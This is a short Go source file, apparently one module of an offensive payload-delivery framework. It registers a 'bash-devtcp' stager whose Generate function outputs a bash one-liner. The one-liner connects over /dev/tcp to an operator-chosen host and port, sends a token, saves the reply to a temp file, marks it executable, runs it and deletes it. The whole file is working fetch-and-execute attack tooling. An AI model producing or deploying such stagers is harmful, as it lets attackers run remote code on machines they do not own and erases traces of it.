package loader

import "fmt"

type bashDevTCP struct{}

func init() { Register(&bashDevTCP{}) }

func (b *bashDevTCP) Name() string        { return "bash-devtcp" }
func (b *bashDevTCP) Description() string { return "bash /dev/tcp raw pull (no external tools, no TLS)" }
func (b *bashDevTCP) RequiresTool() string { return "bash" }

func (b *bashDevTCP) Supports(os, arch string) bool {
	return os == "linux" || os == "unknown"
}

func (b *bashDevTCP) Generate(opts StagerOpts) (string, error) {
	if err := ValidateOpts(opts); err != nil {
		return "", err
	}
	return fmt.Sprintf(
		`bash -c 'exec 3<>/dev/tcp/%s/%s;printf "%%s\n" "%s" >&3;f=$(mktemp);cat <&3 >$f;chmod +x $f;$f;rm -f $f'`,
		opts.Host, opts.Port, opts.Token,
	), nil
}
